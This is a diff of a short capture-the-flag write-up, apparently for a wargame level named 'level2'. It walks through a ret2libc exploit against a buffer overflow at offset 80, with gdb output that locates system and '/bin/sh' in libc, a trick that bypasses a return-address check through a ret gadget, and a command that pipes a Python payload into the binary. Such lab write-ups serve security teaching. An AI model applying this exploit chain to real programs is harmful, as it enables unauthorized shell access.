@@ -1,39 +1,48 @@
 # level2
 
+- We can see a buffer overflow at index 80
+
+- To exploit that we need to do a ret2libc so we need to find `system` and `/bin/sh`, we gonna override the 2nd return pointer so we need the 1st one too
+
 - gdb
+
 ```gdb
-r
+  r
 
-ctrl+c
+  ctrl+c
 
-disass main
-   0x0804854b <+12>:	ret
+  disass main
+     0x0804854b <+12>:	ret
 
-info proc map
-Mapped address spaces:
-	Start Addr   End Addr       Size     Offset objfile
-	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
-	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
-	0xb7e2b000 0xb7e2c000     0x1000        0x0
-	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
-	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
-	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
-	0xb7fd2000 0xb7fd5000     0x3000        0x0
-	0xb7fda000 0xb7fdd000     0x3000        0x0
-	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
-	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
-	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
-	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
-	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+  info proc map
+  Mapped address spaces:
+  	Start Addr   End Addr       Size     Offset objfile
+  	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+  	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+  	0xb7e2b000 0xb7e2c000     0x1000        0x0
+  	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+  	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+  	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+  	0xb7fd2000 0xb7fd5000     0x3000        0x0
+  	0xb7fda000 0xb7fdd000     0x3000        0x0
+  	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+  	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+  	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+  	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+  	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
 
-find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
-0xb7f8cc58
+  find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
+  0xb7f8cc58
 
-info func system
-0xb7e6b060  __libc_system
-0xb7e6b060  system
-0xb7f49550  svcerr_systemerr
+  info func system
+  0xb7e6b060  __libc_system
+  0xb7e6b060  system
+  0xb7f49550  svcerr_systemerr
 ```
 
 - The check of the return addr prevent to jump directly to system
-So we jump to the next `ret` instruction then this `ret` will jump to system("/bin/sh")
+  So we jump to the next `ret` instruction then this `ret` will jump to system("/bin/sh")
+
+- ```sh
+  (python /tmp/level2.py;cat) | ./level2
+  ```
